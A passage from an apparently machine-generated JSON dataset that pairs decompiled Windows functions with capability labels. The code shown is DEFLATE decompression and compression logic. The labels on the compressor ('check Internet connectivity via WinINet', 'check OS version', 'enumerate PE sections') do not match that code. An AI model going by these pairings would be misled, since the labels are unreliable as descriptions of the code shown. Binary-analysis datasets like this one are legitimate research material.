           iVar13 = uVar23 + *(uStack228 + 0x42473f);\n                                    uVar2 = 0;\n                                    if (uStack228 == 0x10) {\n                                        uVar2 = *(param_1 + uVar28 + 0x2923);\n                                    }\n                                    iVar14 = uVar28 + 0x2924;\n                                    uVar28 = uVar28 + iVar13;\n                                    puVar26 = param_1 + iVar14;\n                                    for (; iVar13 != 0; iVar13 = iVar13 + -1) {\n                                        *puVar26 = uVar2;\n                                        puVar26 = puVar26 + 1;\n                                    }\n                                }\n                            }\n                            if (uVar28 != iVar13 + iVar14) goto code_r0x004180c7;\n                            puVar6 = param_1 + 0xa49;\n                            puVar12 = param_1 + 0x10;\n                            for (; iVar13 != 0; iVar13 = iVar13 + -1) {\n                                *puVar12 = *puVar6;\n                                puVar6 = puVar6 + 1;\n                                puVar12 = puVar12 + 1;\n                            }\n                            puVar12 = param_1 + 0x378;\n                            for (; iVar14 != 0; iVar14 = iVar14 + -1) {\n                                *puVar12 = *puVar6;\n                                puVar6 = puVar6 + 1;\n                                puVar12 = puVar12 + 1;\n                            }\n                        }\n                        param_1[6] = param_1[6] + -1;\n                    }\ncode_r0x0041836c:\n                    while( true ) {\n                        uVar10 = uVar19;\n                        if (3 < puVar3 - puVar21) break;\n                        if (uVar19 < 0xf) {\n                            if (1 < puVar3 - puVar21) goto code_r0x00418483;\n                            do {\n                                uVar23 = *(param_1 + (uStack240 & 0x3ff) * 2 + 0x160);\n                                if (uVar23 < 0) {\n                                    if (10 < uVar19) {\n                                        iVar13 = 10;\n                                        do {\n                                            uVar23 = *(param_1 +\n                                                      ((uStack240 >> (iVar13 & 0x1f) & 1) + 0x4b0 + ~uVar23) * 2);\n                                            if (-1 < uVar23) goto code_r0x004184a6;\n                                            uVar4 = iVar13 + 2;\n                                            iVar13 = iVar13 + 1;\n                                        } while (uVar4 <= uVar19);\n                                    }\n                                }\n                                else if ((uVar23 >> 9 != 0) && (uVar23 >> 9 <= uVar19)) break;\n                                if (puVar21 < puVar3) {\n                                    uVar23 = *puVar21;\n                                    puVar21 = puVar21 + 1;\n                                }\n                                else {\ncode_r0x00418426:\n                                    if ((param_7 & 2) != 0) {\n                                        *param_1 = 0x17;\n                                        goto code_r0x00417619;\n                                    }\n                                    uVar23 = 0;\n                                }\ncode_r0x00418464:\n                                uStack240 = uStack240 | uVar23 << (uVar19 & 0x1f);\n                                uVar19 = uVar19 + 8;\n                            } while (uVar19 < 0xf);\n                        }\ncode_r0x004184a6:\n                        uVar28 = *(param_1 + (uStack240 & 0x3ff) * 2 + 0x160);\n                        if (uVar28 < 0) {\n                            iVar13 = 10;\n                            do {\n                                iVar14 = iVar13 + 1;\n                                uVar28 = *(param_1 + ((uStack240 >> (iVar13 & 0x1f) & 1) + 0x4b0 + ~uVar28) * 2);\n                                iVar13 = iVar14;\n                            } while (uVar28 < 0);\n                        }\n                        else {\n                            iVar14 = uVar28 >> 9;\n                            uVar28 = uVar28 & 0x1ff;\n                        }\n                        uVar19 = uVar19 - iVar14;\n                        uStack240 = uStack240 >> (iVar14 & 0x1f);\n                        uVar23 = uVar28;\n                        if (0xff < uVar28) goto code_r0x0041867b;\ncode_r0x0041852c:\n                        if (puVar24 <= puStack244) {\n                            *param_1 = 0x18;\n                            goto code_r0x00418a1d;\n                        }\n                        *puStack244 = uVar28;\n                        puStack244 = puStack244 + 1;\n                    }\n                    if (puVar24 - puStack244 < 2) {\n                        if (uVar19 < 0xf) {\ncode_r0x00418483:\n                            uStack240 = uStack240 | *puVar21 << (uVar10 & 0x1f) | *(puVar21 + 1) << (uVar10 + 8 & 0x1f);\n                            uVar19 = uVar19 + 0x10;\n                            puVar21 = puVar21 + 1;\n                        }\n                        goto code_r0x004184a6;\n                    }\n                    if (uVar19 < 0xf) {\n                        uVar1 = *puVar21;\n                        puVar21 = puVar21 + 1;\n                        uStack240 = uStack240 | uVar1 << (uVar10 & 0x1f);\n                        uVar19 = uVar19 + 0x10;\n                    }\n                    uVar28 = *(param_1 + (uStack240 & 0x3ff) * 2 + 0x160);\n                    if (uVar28 < 0) {\n                        iVar13 = 10;\n                        do {\n                            iVar14 = iVar13 + 1;\n                            uVar28 = *(param_1 + ((uStack240 >> (iVar13 & 0x1f) & 1) + 0x4b0 + ~uVar28) * 2);\n                            iVar13 = iVar14;\n                        } while (uVar28 < 0);\n                    }\n                    else {\n                        iVar14 = uVar28 >> 9;\n                    }\n                    uStack240 = uStack240 >> (iVar14 & 0x1f);\n                    uVar19 = uVar19 - iVar14;\n                    uVar23 = uVar28;\n                    if ((uVar28 & 0x100) == 0) {\n                        if (uVar19 < 0xf) {\n                            uVar1 = *puVar21;\n                            puVar21 = puVar21 + 1;\n                            uStack240 = uStack240 | uVar1 << (uVar19 & 0x1f);\n                            uVar19 = uVar19 + 0x10;\n                        }\n                        uVar23 = *(param_1 + (uStack240 & 0x3ff) * 2 + 0x160);\n                        if (uVar23 < 0) {\n                            iVar13 = 10;\n                            do {\n                                uStack216 = iVar13 + 1;\n                                uVar23 = *(param_1 + ((uStack240 >> (iVar13 & 0x1f) & 1) + 0x4b0 + ~uVar23) * 2);\n                                iVar13 = uStack216;\n                            } while (uVar23 < 0);\n                        }\n                        else {\n                            uStack216 = uVar23 >> 9;\n                        }\n                        uStack240 = uStack240 >> (uStack216 & 0x1f);\n                        uVar19 = uVar19 - uStack216;\n                        *puStack244 = uVar28;\n                        if ((uVar23 & 0x100) == 0) {\n                            *(puStack244 + 1) = uVar23;\n                            puStack244 = puStack244 + 2;\n                            goto code_r0x0041836c;\n                        }\n                        puStack244 = puStack244 + 1;\n                    }\ncode_r0x0041867b:\n                    uVar28 = uVar23 & 0x1ff;\n                    if (uVar28 != 0x100) {\n                        uStack232 = *((uVar28 - 0x101) * 4 + 0x424c20);\n                        uVar28 = *((uVar28 - 0x101) * 4 + 0x424ba0);\n                        if (uStack232 != 0) {\n                            if (uVar19 < uStack232) {\n                                do {\n                                    if (puVar21 < puVar3) {\n                                        uVar23 = *puVar21;\n                                        puVar21 = puVar21 + 1;\n                                    }\n                                    else {\ncode_r0x004186de:\n                                        if ((param_7 & 2) != 0) {\n                                            *param_1 = 0x19;\n                                            goto code_r0x00417619;\n                                        }\n                                        uVar23 = 0;\n                                    }\ncode_r0x0041871c:\n                                    uStack240 = uStack240 | uVar23 << (uVar19 & 0x1f);\n                                    uVar19 = uVar19 + 8;\n                                } while (uVar19 < uStack232);\n                            }\n                            uVar19 = uVar19 - uStack232;\n                            uVar23 = (1 << (uStack232 & 0x1f)) - 1U & uStack240;\n                            uStack240 = uStack240 >> (uStack232 & 0x1f);\n                            uVar28 = uVar28 + uVar23;\n                        }\n                        puVar22 = puVar21;\n                        if (uVar19 < 0xf) {\n                            if (puVar3 - puVar21 < 2) {\n                                do {\n                                    uVar23 = *(param_1 + (uStack240 & 0x3ff) * 2 + 0xf00);\n                                    if (uVar23 < 0) {\n                                        if (10 < uVar19) {\n                                            iVar13 = 10;\n                                            do {\n                                                uVar23 = *(param_1 +\n                                                          ((uStack240 >> (iVar13 & 0x1f) & 1) + 0xb80 + ~uVar23) * 2);\n                                                if (-1 < uVar23) goto code_r0x0041886e;\n                                                uVar4 = iVar13 + 2;\n                                                iVar13 = iVar13 + 1;\n                                            } while (uVar4 <= uVar19);\n                                        }\n                                    }\n                                    else if ((uVar23 >> 9 != 0) && (uVar23 >> 9 <= uVar19)) break;\n                                    if (puVar22 < puVar3) {\n                                        uVar23 = *puVar22;\n                                        puVar22 = puVar22 + 1;\n                                    }\n                                    else {\ncode_r0x004187f3:\n                                        if ((param_7 & 2) != 0) {\n                                            *param_1 = 0x1a;\n                                            puVar21 = puVar22;\n                                            goto code_r0x00417619;\n                                        }\n                                        uVar23 = 0;\n                                    }\ncode_r0x00418831:\n                                    uStack240 = uStack240 | uVar23 << (uVar19 & 0x1f);\n                                    uVar19 = uVar19 + 8;\n                                } while (uVar19 < 0xf);\n                            }\n                            else {\n                                puVar22 = puVar21 + 1;\n                                uStack240 = uStack240 |\n                                            *puVar21 << (uVar19 & 0x1f) | *(puVar21 + 1) << (uVar19 + 8 & 0x1f);\n                                uVar19 = uVar19 + 0x10;\n                            }\n                        }\ncode_r0x0041886e:\n                        uVar23 = *(param_1 + (uStack240 & 0x3ff) * 2 + 0xf00);\n                        if (uVar23 < 0) {\n                            iVar13 = 10;\n                            do {\n                                iVar14 = iVar13 + 1;\n                                uVar23 = *(param_1 + ((uStack240 >> (iVar13 & 0x1f) & 1) + 0xb80 + ~uVar23) * 2);\n                                iVar13 = iVar14;\n                            } while (uVar23 < 0);\n                        }\n                        else {\n                            iVar14 = uVar23 >> 9;\n                            uVar23 = uVar23 & 0x1ff;\n                        }\n                        uStack240 = uStack240 >> (iVar14 & 0x1f);\n                        uVar19 = uVar19 - iVar14;\n                        uStack232 = *(uVar23 * 4 + 0x424b20);\n                        uStack228 = *(uVar23 * 4 + 0x424aa0);\n                        puVar21 = puVar22;\n                        if (uStack232 != 0) {\n                            if (uVar19 < uStack232) {\n                                do {\n                                    if (puVar22 < puVar3) {\n                                        uVar23 = *puVar22;\n                                        puVar22 = puVar22 + 1;\n                                    }\n                                    else {\ncode_r0x0041891b:\n                                        if ((param_7 & 2) != 0) {\n                                            *param_1 = 0x1b;\n                                            puVar21 = puVar22;\n                                            goto code_r0x00417619;\n                                        }\n                                        uVar23 = 0;\n                                    }\ncode_r0x00418959:\n                                    uStack240 = uStack240 | uVar23 << (uVar19 & 0x1f);\n                                    uVar19 = uVar19 + 8;\n                                } while (uVar19 < uStack232);\n                            }\n                            uVar19 = uVar19 - uStack232;\n                            uVar23 = (1 << (uStack232 & 0x1f)) - 1U & uStack240;\n                            uStack240 = uStack240 >> (uStack232 & 0x1f);\n                            uStack228 = uStack228 + uVar23;\n                            puVar21 = puVar22;\n                        }\n                        uStack224 = puStack244 - param_4;\n                        if ((uStack224 < uStack228) && (uVar25 != 0)) goto code_r0x004189be;\n                        puVar6 = (uStack224 - uStack228 & puStack204) + param_4;\n                        puVar12 = puStack244;\n                        if (puStack244 < puVar6) {\n                            puVar12 = puVar6;\n                        }\n                        uVar23 = uVar28;\n                        if (puVar24 < puVar12 + uVar28) {\n                            while (uVar28 = uVar23 - 1,  uVar23 != 0) {\ncode_r0x00418a07:\n                                if (puVar24 <= puStack244) {\n                                    *param_1 = 0x35;\n                                    goto code_r0x00418a1d;\n                                }\n                                *puStack244 = *(param_4 + (uStack224 - uStack228 & puStack204));\n                                uStack224 = uStack224 + 1;\n                                puStack244 = puStack244 + 1;\n                                uVar23 = uVar28;\n                            }\n                            goto code_r0x0041836c;\n                        }\n                        if ((uVar28 < 9) || (uStack228 < uVar28)) {\ncode_r0x00418aaa:\n                            do {\n                                puVar8 = puVar6;\n                                uVar28 = uVar28 - 3;\n                                puVar12 = puStack244 + 3;\n                                *puStack244 = *puVar8;\n                                *(puStack244 + 1) = *(puVar8 + 1);\n                                *(puStack244 + 2) = *(puVar8 + 2);\n                                puVar6 = puVar8 + 3;\n                                puStack244 = puVar12;\n                            } while (2 < uVar28);\n                            if (uVar28 < 1) goto code_r0x0041836c;\n                            *puVar12 = *(puVar8 + 3);\n                            if (uVar28 == 2) {\n                                uVar10 = *(puVar8 + 1);\ncode_r0x00418ae5:\n                                *(puStack244 + 1) = uVar10;\n                            }\n                        }\n                        else {\n                            puVar12 = puVar6;\n                            do {\n                                puVar7 = puVar12;\n                                puVar12 = puVar7 + 2;\n                                puVar8 = puStack244 + 2;\n                                *puStack244 = *puVar7;\n                                puStack244[1] = puVar7[1];\n                                puStack244 = puVar8;\n                            } while (puVar12 < (uVar28 & 0xfffffff8) + puVar6);\n                            uVar28 = uVar28 & 7;\n                            puVar6 = puVar12;\n                            if (2 < uVar28) goto code_r0x00418aaa;\n                            if (uVar28 == 0) goto code_r0x0041836c;\n                            *puVar8 = *puVar12;\n                            if (uVar28 == 2) {\n                                uVar10 = *(puVar7 + 9);\n                                goto code_r0x00418ae5;\n                            }\n                        }\n                        puStack244 = puStack244 + uVar28;\n                        goto code_r0x0041836c;\n                    }\n                }\n            } while ((*(param_1 + 5) & 1) == 0);\n            if ((param_7 & 1) != 0) {\n                for (; uVar19 < (uVar19 & 7); uVar19 = uVar19 + 8) {\n                    if (puVar21 < puVar3) {\n                        uVar25 = *puVar21;\n                        puVar21 = puVar21 + 1;\n                    }\n                    else {\ncode_r0x00418b3e:\n                        if ((param_7 & 2) != 0) {\n                            *param_1 = 0x20;\n                            goto code_r0x00417619;\n                        }\n                        uVar25 = 0;\n                    }\ncode_r0x00418b7c:\n                    uStack240 = uStack240 | uVar25 << (uVar19 & 0x1f);\n                }\n                uVar28 = 0;\n                uStack240 = uStack240 >> (uVar19 & 7);\n                uVar19 = uVar19 & 0xfffffff8;\n                do {\n                    if (uVar19 == 0) {\n                        if (puVar21 < puVar3) {\n                            uVar25 = *puVar21;\n                            puVar21 = puVar21 + 1;\n                        }\n                        else {\ncode_r0x00418c5c:\n                            if ((param_7 & 2) != 0) {\n                                *param_1 = 0x2a;\n                                goto code_r0x00417619;\n                            }\n                            uVar25 = 0;\n                        }\n                    }\n                    else {\n                        for (; uVar19 < 8; uVar19 = uVar19 + 8) {\n                            if (puVar21 < puVar3) {\n                                uVar25 = *puVar21;\n                                puVar21 = puVar21 + 1;\n                            }\n                            else {\ncode_r0x00418bd4:\n                                if ((param_7 & 2) != 0) {\n                                    *param_1 = 0x29;\n                                    goto code_r0x00417619;\n                                }\n                                uVar25 = 0;\n                            }\ncode_r0x00418c12:\n                            uStack240 = uStack240 | uVar25 << (uVar19 & 0x1f);\n                        }\n                        uVar25 = uStack240 & 0xff;\n                        uStack240 = uStack240 >> 8;\n                        uVar19 = uVar19 - 8;\n                    }\ncode_r0x00418c9a:\n                    uVar28 = uVar28 + 1;\n                    param_1[4] = uVar25 | param_1[4] << 8;\n                } while (uVar28 < 4);\n            }\ncode_r0x00418cc8:\n            uVar25 = 0;\n            *param_1 = 0x22;\n            goto code_r0x00418ced;\n        }\n        uVar28 = 1;\ncode_r0x004176d6:\n        *param_1 = 0x24;\n        puStack244 = param_5;\n        break;\n    case 3:\n        if (param_2 < puVar3) {\n            puVar21 = param_2 + 1;\n            puStack244 = param_5;\n            uVar23 = *param_2;\n            goto code_r0x00417794;\n        }\n        puStack244 = param_5;\n        goto code_r0x00417756;\n    default:\n        puStack244 = param_5;\n        break;\n    case 5:\n        if (param_2 < puVar3) {\n            puVar21 = param_2 + 1;\n            puStack244 = param_5;\n            uVar23 = *param_2;\n            goto code_r0x0041783f;\n        }\n        puStack244 = param_5;\n        goto code_r0x00417801;\n    case 6:\n        if (param_2 < puVar3) {\n            puVar21 = param_2 + 1;\n            puStack244 = param_5;\n            uVar23 = *param_2;\n            goto code_r0x004178da;\n        }\n        puStack244 = param_5;\n        goto code_r0x0041789c;\n    case 7:\n        if (param_2 < puVar3) {\n            puVar21 = param_2 + 1;\n            *(param_1 + uVar28 + 0x2920) = *param_2;\n            puStack244 = param_5;\n            goto code_r0x00417992;\n        }\n        puStack244 = param_5;\n        goto code_r0x00417934;\n    case 9:\n        puStack244 = param_5;\n        goto code_r0x00417ad0;\n    case 10:\n        puStack244 = param_5;\ncode_r0x00417b8f:\n        *param_1 = 10;\n        break;\n    case 0xb:\n        if (param_2 < puVar3) {\n            puVar21 = param_2 + 1;\n            puStack244 = param_5;\n            uVar23 = *param_2;\n            goto code_r0x00417c85;\n        }\n        puStack244 = param_5;\n        goto code_r0x00417c47;\n    case 0xe:\n        if (param_2 < puVar3) {\n            puVar21 = param_2 + 1;\n            puStack244 = param_5;\n            uVar23 = *param_2;\n            goto code_r0x00417d47;\n        }\n        puStack244 = param_5;\n        goto code_r0x00417d10;\n    case 0x10:\n        if (param_2 < puVar3) {\n            puVar22 = param_2 + 1;\n            puStack244 = param_5;\n            uVar23 = *param_2;\n            goto code_r0x00417e25;\n        }\n        puStack244 = param_5;\n        goto code_r0x00417dee;\n    case 0x11:\n        puStack244 = param_5;\ncode_r0x00417f83:\n        *param_1 = 0x11;\n        break;\n    case 0x12:\n        if (param_2 < puVar3) {\n            puVar22 = param_2 + 1;\n            puStack244 = param_5;\n            uVar23 = *param_2;\n            goto code_r0x0041800a;\n        }\n        puStack244 = param_5;\n        goto code_r0x00417fcc;\n    case 0x15:\n        puStack244 = param_5;\ncode_r0x004180c7:\n        *param_1 = 0x15;\n        break;\n    case 0x17:\n        if (param_2 < puVar3) {\n            puVar21 = param_2 + 1;\n            puStack244 = param_5;\n            uVar23 = *param_2;\n            goto code_r0x00418464;\n        }\n        puStack244 = param_5;\n        goto code_r0x00418426;\n    case 0x18:\n        puStack244 = param_5;\n        goto code_r0x0041852c;\n    case 0x19:\n        if (param_2 < puVar3) {\n            puVar21 = param_2 + 1;\n            puStack244 = param_5;\n            uVar23 = *param_2;\n            goto code_r0x0041871c;\n        }\n        puStack244 = param_5;\n        goto code_r0x004186de;\n    case 0x1a:\n        if (param_2 < puVar3) {\n            puVar22 = param_2 + 1;\n            puStack244 = param_5;\n            uVar23 = *param_2;\n            goto code_r0x00418831;\n        }\n        puStack244 = param_5;\n        goto code_r0x004187f3;\n    case 0x1b:\n        if (param_2 < puVar3) {\n            puVar22 = param_2 + 1;\n            puStack244 = param_5;\n            uVar23 = *param_2;\n            goto code_r0x00418959;\n        }\n        puStack244 = param_5;\n        goto code_r0x0041891b;\n    case 0x20:\n        if (param_2 < puVar3) {\n            puVar21 = param_2 + 1;\n            puStack244 = param_5;\n            uVar25 = *param_2;\n            goto code_r0x00418b7c;\n        }\n        puStack244 = param_5;\n        goto code_r0x00418b3e;\n    case 0x22:\n        puStack244 = param_5;\n        goto code_r0x00418cc8;\n    case 0x23:\n        puStack244 = param_5;\ncode_r0x00417dbe:\n        *param_1 = 0x23;\n        break;\n    case 0x24:\n        goto code_r0x004176d6;\n    case 0x25:\n        puStack244 = param_5;\ncode_r0x004189be:\n        *param_1 = 0x25;\n        break;\n    case 0x26:\n        puStack244 = param_5;\n        goto code_r0x00417b1f;\n    case 0x27:\n        puStack244 = param_5;\ncode_r0x004179d0:\n        *param_1 = 0x27;\n        break;\n    case 0x28:\n        puStack244 = param_5;\ncode_r0x00417afc:\n        *param_1 = 0x28;\n        break;\n    case 0x29:\n        if (param_2 < puVar3) {\n            puVar21 = param_2 + 1;\n            puStack244 = param_5;\n            uVar25 = *param_2;\n            goto code_r0x00418c12;\n        }\n        puStack244 = param_5;\n        goto code_r0x00418bd4;\n    case 0x2a:\n        if (param_2 < puVar3) {\n            puVar21 = param_2 + 1;\n            puStack244 = param_5;\n            uVar25 = *param_2;\n            goto code_r0x00418c9a;\n        }\n        puStack244 = param_5;\n        goto code_r0x00418c5c;\n    case 0x33:\n        if (param_2 < puVar3) {\n            puVar21 = param_2 + 1;\n            puStack244 = param_5;\n            uVar23 = *param_2;\n            goto code_r0x00417a37;\n        }\n        puStack244 = param_5;\n        goto code_r0x00417a00;\n    case 0x34:\n        puStack244 = param_5;\n        goto code_r0x00417a80;\n    case 0x35:\n        puStack244 = param_5;\n        goto code_r0x00418a07;\n    }\n    uVar25 = 0xffffffff;\ncode_r0x00418ced:\n    param_1[0xe] = uStack240;\n    param_1[9] = uVar28;\n    param_1[1] = uVar19;\n    param_1[8] = uStack228;\n    param_1[10] = uStack232;\n    param_1[0xf] = uStack224;\n    uVar28 = puStack244 - param_5;\n    *param_3 = puVar21 - param_2;\n    *param_6 = uVar28;\n    if (((param_7 & 9) != 0) && (uVar25 != 0xffffffff)) {\n        uVar19 = param_1[7] & 0xffff;\n        uVar23 = param_1[7] >> 0x10;\n        puVar29 = uVar28 % 0x15b0;\n        while (uVar28 != 0) {\n            for (puVar9 = param_5 + 7; puVar9 + -param_5 < puVar29; puVar9 = puVar9 + 8) {\n                iVar20 = uVar19 + puVar9[-7];\n                iVar13 = puVar9[-6] + iVar20;\n                iVar14 = iVar13 + puVar9[-5];\n                iVar15 = iVar14 + puVar9[-4];\n                iVar16 = iVar15 + puVar9[-3];\n                iVar17 = iVar16 + puVar9[-2];\n                iVar18 = iVar17 + puVar9[-1];\n                uVar19 = *puVar9 + iVar18;\n                uVar23 = uVar23 + iVar20 + iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + iVar18 + uVar19;\n            }\n            param_5 = param_5 + (puVar29 & 0x1ff8);\n            iVar13 = (puVar29 & 0x1ff8) - param_5;\n            for (; param_5 + iVar13 < puVar29; param_5 = param_5 + 1) {\n                uVar19 = uVar19 + *param_5;\n                uVar23 = uVar23 + uVar19;\n            }\n            uVar19 = uVar19 % 0xfff1;\n            uVar23 = uVar23 % 0xfff1;\n            uVar28 = uVar28 - puVar29;\n            puVar29 = 0x15b0;\n        }\n        iVar13 = uVar19 + uVar23 * 0x10000;\n        param_1[7] = iVar13;\n        if ((uVar25 == 0) && (uVar25 = uVar28,  (param_7 & 1) != 0)) {\n            uVar25 = (iVar13 == param_1[4]) * 2 - 2;\n        }\n    }\n    return uVar25;\n}\n",
        "token_count": 13112
    },
    "00419463": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00419463(int32_t *param_1, uint8_t *param_2, code **param_3, int32_t param_4, int32_t *param_5, \n                    int32_t param_6)\n\n{\n    code cVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    uint16_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    code *pcVar9;\n    int16_t *piVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    code *pcVar13;\n    code *pcVar14;\n    uint32_t *puVar15;\n    int32_t iVar16;\n    code *pcVar17;\n    code *pcVar18;\n    uchar *puVar19;\n    int16_t *piVar20;\n    code *pcVar21;\n    uchar *puVar22;\n    uint32_t *puVar23;\n    int16_t *piVar24;\n    uint *puVar25;\n    char *pcVar26;\n    uint uVar27;\n    code *pcStack104;\n    code *pcStack100;\n    code *pcStack96;\n    code *pcStack92;\n    code *pcStack88;\n    code *pcStack84;\n    uint8_t *puStack80;\n    code *pcStack76;\n    int32_t *piStack72;\n    code *pcStack60;\n    uint16_t uStack44;\n    int32_t iStack40;\n    \n    if (param_1 == NULL) {\n        if (param_3 != NULL) {\n            *param_3 = NULL;\n        }\n        if (param_5 == NULL) {\n            return -2;\n        }\n        *param_5 = 0;\n        return -2;\n    }\n    pcVar18 = NULL;\n    param_1[0x1e] = param_3;\n    param_1[0x1d] = param_4;\n    param_1[0x1f] = param_5;\n    param_1[0x1c] = param_2;\n    param_1[0x21] = param_2;\n    if (param_3 != NULL) {\n        pcVar18 = *param_3;\n    }\n    param_1[0x22] = pcVar18;\n    param_1[0x23] = 0;\n    param_1[0x20] = param_6;\n    if ((((*param_1 == 0) == (param_5 != NULL || param_4 != 0)) && (param_1[0x1b] == 0)) &&\n       ((param_6 == 4 || (param_1[0x1a] == 0)))) {\n        if (((param_3 != NULL) && (*param_3 != NULL)) && (param_2 == NULL)) {\ncode_r0x0041954e:\n            *param_3 = NULL;\n            goto code_r0x00419554;\n        }\n        if (((param_5 == NULL) || (*param_5 == 0)) || (param_4 != 0)) {\n            param_1[0x1a] = param_1[0x1a] | param_6 == 4;\n            if ((param_1[0x17] != 0) || (param_1[0x18] != 0)) goto code_r0x0041a435;\n            if ((param_1[2] & 0xb4fffU) == 0x4001) {\n                pcStack92 = param_1[7];\n                pcVar18 = param_1[10];\n                pcStack104 = param_1[8];\n                pcStack100 = param_1[9];\n                puStack80 = param_1[0xf];\n                pcStack88 = param_1[0xe];\n                pcStack96 = param_1[0xb];\n                pcStack76 = pcStack92 & 0x7fff;\n                piStack72 = param_1 + 0x24;\n                pcStack60 = param_1 + 0x1926a;\n                goto code_r0x0041961a;\n            }\n            puStack80 = param_2;\ncode_r0x00419ae1:\n            if ((pcVar18 == NULL) && ((param_6 == 0 || (param_1[8] == 0)))) {\ncode_r0x0041a377:\n                param_1[0x22] = pcVar18;\n                param_1[0x21] = puStack80;\n                goto code_r0x0041a387;\n            }\n            pcStack100 = param_1[9];\n            iVar11 = param_1[8];\n            if (pcStack100 + iVar11 < 0x2) {\n                while ((pcVar18 != NULL && (uVar12 = param_1[8],  uVar12 < 0x102))) {\n                    puVar4 = puStack80 + 1;\n                    iVar11 = param_1[7];\n                    pcVar18 = pcVar18 + -1;\n                    uVar2 = *puStack80;\n                    uVar7 = iVar11 + uVar12 & 0x7fff;\n                    *(param_1 + uVar7 + 0x90) = uVar2;\n                    if (uVar7 < 0x101) {\n                        *(param_1 + uVar7 + 0x8090) = uVar2;\n                    }\n                    iVar16 = uVar12 + 1;\n                    param_1[8] = iVar16;\n                    puStack80 = puVar4;\n                    if (0x2 < pcStack100 + iVar16) {\n                        iVar16 = iVar16 + iVar11;\n                        uVar12 = iVar16 - 3;\n                        uVar8 = uVar12 & 0x7fff;\n                        uVar7 = (uVar2 ^ *(param_1 + uVar8 + 0x90) << 10 ^\n                                         *(param_1 + (iVar16 - 2U & 0x7fff) + 0x90) << 5) & 0x7fff;\n                        *(param_1 + uVar8 * 2 + 0x19272) = *(param_1 + uVar7 * 2 + 0x29272);\n                        *(param_1 + uVar7 * 2 + 0x29272) = uVar12;\n                    }\n                }\n            }\n            else {\n                uVar12 = param_1[7] + iVar11;\n                pcStack104 = *(param_1 + (uVar12 - 2 & 0x7fff) + 0x90) << 5 ^ *(param_1 + (uVar12 - 1 & 0x7fff) + 0x90);\n                pcVar9 = 0x102 - iVar11;\n                if (pcVar18 < 0x102 - iVar11) {\n                    pcVar9 = pcVar18;\n                }\n                pcVar18 = pcVar18 + -pcVar9;\n                param_1[8] = pcVar9 + iVar11;\n                pcStack92 = puStack80;\n                pcStack96 = uVar12 - 2;\n                while (uVar12 = uVar12 & 0x7fff,  puStack80 + pcVar9 != pcStack92) {\n                    uVar2 = *pcStack92;\n                    *(param_1 + uVar12 + 0x90) = uVar2;\n                    if (uVar12 < 0x101) {\n                        *(param_1 + uVar12 + 0x8090) = uVar2;\n                    }\n                    uVar12 = uVar12 + 1;\n                    pcStack104 = (pcStack104 << 5 ^ uVar2) & 0x7fff;\n                    *(param_1 + (pcStack96 & 0x7fff) * 2 + 0x19272) = *(param_1 + pcStack104 * 2 + 0x29272);\n                    *(param_1 + pcStack104 * 2 + 0x29272) = pcStack96;\n                    pcStack96 = pcStack96 + 1;\n                    pcStack92 = pcStack92 + 1;\n                }\n                puStack80 = puStack80 + pcVar9;\n            }\n            pcVar9 = param_1[8];\n            pcStack76 = 0x8000 - pcVar9;\n            if (pcStack100 < pcStack76) {\n                pcStack76 = pcStack100;\n            }\n            param_1[9] = pcStack76;\n            if ((pcVar9 < 0x102) && (param_6 == 0)) goto code_r0x0041a377;\n            pcStack92 = param_1[0x14];\n            pcStack96 = pcStack92;\n            if (pcStack92 == NULL) {\n                pcStack96 = 0x2;\n            }\n            piStack72 = param_1[7];\n            pcStack88 = piStack72 & 0x7fff;\n            uVar12 = param_1[2];\n            pcVar13 = pcStack96;\n            pcStack104 = pcVar9;\n            if ((uVar12 & 0x90000) == 0) {\n                if (pcVar9 < 0x103) {\n                    if (pcStack96 < pcVar9) {\n                        iStack40 = param_1[(0x1f < pcStack96) + 3];\n                        pcVar14 = pcStack88 + -1;\n                        piVar10 = param_1 + 0x24 + pcStack88;\n                        uStack44 = CONCAT11(*(param_1 + pcVar14 + pcStack96 + 0x91), \n                                            *(param_1 + 0x24 + pcVar14 + pcStack96));\n                        pcVar17 = NULL;\n                        pcStack100 = pcStack88;\ncode_r0x00419df9:\n                        iStack40 = iStack40 + -1;\n                        if (((iStack40 != 0) && (uVar3 = *(param_1 + pcStack100 * 2 + 0x19272),  uVar3 != 0)) &&\n                           (pcStack84 = piStack72 - uVar3 & 0xffff,  pcStack84 <= pcStack76)) {\n                            pcStack60 = uStack44;\n                            pcStack100 = uVar3 & 0x7fff;\n                            pcVar21 = pcStack96 + -1;\n                            if (CONCAT11(*(param_1 + pcStack100 + pcVar21 + 0x91), \n                                         *(param_1 + 0x24 + pcStack100 + pcVar21)) == pcStack60) goto code_r0x00419f30;\n                            uVar3 = *(param_1 + pcStack100 * 2 + 0x19272);\n                            pcStack100 = uVar3;\n                            if ((uVar3 != 0) && (pcStack84 = piStack72 - pcStack100 & 0xffff,  pcStack84 <= pcStack76))\n                            {\n                                pcStack100 = pcStack100 & 0x7fff;\n                                if (pcStack60 ==\n                                    CONCAT11(*(param_1 + pcStack100 + pcVar21 + 0x91), \n                                             *(param_1 + 0x24 + pcStack100 + pcVar21))) goto code_r0x00419f30;\n                                uVar3 = *(param_1 + pcStack100 * 2 + 0x19272);\n                                pcStack100 = uVar3;\n                                if ((uVar3 != 0) &&\n                                   (pcStack84 = piStack72 - pcStack100 & 0xffff,  pcStack84 <= pcStack76))\n                                goto code_r0x00419f01;\n                            }\n                        }\n                        goto code_r0x00419fb6;\n                    }\ncode_r0x0041a4af:\n                    pcVar17 = NULL;\n                    goto code_r0x00419fcd;\n                }\n                uVar27 = 0xcbd;\n                pcVar26 = \"max_match_len <= TDEFL_MAX_MATCH_LEN\";\ncode_r0x00419926:\n                sub.msvcrt.dll__assert(pcVar26, 0x424620, uVar27);\n                while( true ) {\n                    param_1[10] = pcVar18;\n                    param_1[7] = pcStack92;\n                    param_1[8] = pcStack104;\n                    param_1[9] = pcStack100;\n                    param_1[0xf] = puStack80;\n                    param_1[0xb] = 